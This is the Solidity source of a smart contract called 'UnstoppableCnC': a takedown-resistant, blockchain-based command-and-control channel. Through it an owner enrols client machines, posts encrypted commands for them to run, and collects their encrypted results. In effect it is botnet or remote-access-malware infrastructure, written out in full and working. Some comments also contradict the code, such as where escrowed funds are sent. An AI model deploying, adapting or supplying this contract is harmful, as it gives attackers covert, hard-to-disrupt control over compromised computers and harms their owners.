pragma solidity ^0.4.0;

contract UnstoppableCnC {
    
    address public owner;
    string public ownerPubKey;
    uint public creationTime;

	enum InstanceStates { NotExist, Inactive, Active, Disabled }

	struct Instance{
		InstanceStates state; // default is NotExist
		uint256 funds;
	}
	
	mapping (bytes32 => Instance) public instances;
	
	
	/* events triggered by Client */
	
	event RegistrationRequest (bytes32 machineIdHash);//machineIdHash is encrypted
	
	event CommandResult (bytes32 sessionAndMachineIdHash, string commandResult, uint16 cmdId); //commandResult is encrypted
	
	
	/* events triggered by Server */
	
	event InstanceRegistered (bytes32 indexed instanceHash, bytes32 sessionId, uint256 fundsTransferred);//sessionId is encrypted
	
	event CommandPending (bytes32 indexed instanceHash, string command, uint16 cmdId); //command is encrypted
	
	
	
	/*
		Constructor to init the contract. auto adds allowed addresses and sets the private key to encrypt messages to this contract.
	*/
	function UnstoppableCnC (string pubkey, bytes32[] addressHashes) 
	    public
	{
	    owner = msg.sender;
	    ownerPubKey = pubkey;
	    creationTime = now;
	    
		for (uint i = 0 ; i < addressHashes.length; i++){
			allowInstance(addressHashes[i]);
		}
	}
	
	/*
		Allows only for a specific account to access
	*/
	modifier onlyBy(address _account){
        require(msg.sender == _account);
        _;
    }
    
    /* 
        Function with this modifier must match the given address to be an instance of a given state
    */
    modifier onlyByValidInstanceState(bytes32 instanceHash, InstanceStates state){
        require (instances[instanceHash].state == state);
        _;
    }
    
	/*
		Initial Registration request by the client. Sends its unique machine Id hash to be bound to this account.
		Will only proceed if this address is in Inactive state (allowed but not yet registered)
	*/
	function registerInstance(bytes32 machineIdHash)
	    public onlyByValidInstanceState(keccak256(msg.sender),InstanceStates.Inactive) {//Instance state must be inactive, meaning it was allowed and not activated yet and not disabled.
		
		RegistrationRequest(machineIdHash);
		
	}
	
	/*
		Upon successful registration only, server calls this function to let the client know its registration was successful.
		Server return the client a unique sessionId, which will use him to identify from now on.
		SessionId is derived from client address + machineId + random nonce, and is done server side.
		If server has funds to transfer to client, it will also be transferred.
	*/
	function registrationConfirmation(bytes32 instanceHash, bytes32 sessionId) //sessionId is encrypted
		public onlyBy(owner){
		
		instances[instanceHash].state = InstanceStates.Active;
		
		InstanceRegistered(instanceHash, sessionId, instances[instanceHash].funds);
		
		if (instances[instanceHash].funds > 0){
			msg.sender.transfer(instances[instanceHash].funds);
			instances[instanceHash].funds = 0;
		}
	}
	
	
	/**
		Methods for instances. this methods will execute for registered addresses only
	**/
	
	/*
		instances call this function to return the results of executed commands.
		sessionAndMachineIdHash: a hash of concatenation of machineId and sessionId. This is done in order for the client to prove he still on the same original computer + he knows the given machineId
		result: result of the command
		cmdId: command id. have be the answer to the command with the same Id.
	*/
	function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId) 
	    public onlyByValidInstanceState(keccak256(msg.sender), InstanceStates.Active)
	    returns (bool)
	{
	
		CommandResult(sessionAndMachineIdHash, result, cmdId);
		return true;
	}
		
	/**
		Methods for operator. this methods will execute for the contract owner only
	**/
	

	/*
		Adds an instance to allowed list.
		instanceHash: Keccak256 hash of the destination client address.
	*/
	function allowInstance (bytes32 instanceHash) 
	    public onlyBy(owner) payable returns (bool success) {
	   
	   instances[instanceHash] = Instance({ state: InstanceStates.Inactive, funds: msg.value });
	   return true;
    }
    
	/*
		Revoke instance id access
		instanceHash: Keccak256 hash of the destination client address.
	*/
	function removeInstance (bytes32 instanceHash) 
	    public onlyBy(owner) returns (bool success){
	        instances[instanceHash].state = InstanceStates.Disabled;
	        return true;
	    }
	
	/*
		Adds a command to be executed on the client. caller must be owner and destination client must be in Active state.
		instanceHash: Keccak256 hash of the destination client address.
		command: command to be executed.
		cmdId: Command Id to identify the command.
	*/
	function addWork (bytes32 instanceHash, string command, uint16 cmdId) 
	    public onlyBy(owner) 
	    onlyByValidInstanceState(instanceHash, InstanceStates.Active)
	    returns (bool) {
	        
		CommandPending(instanceHash, command, cmdId);
		
	    return true;
	}
	

}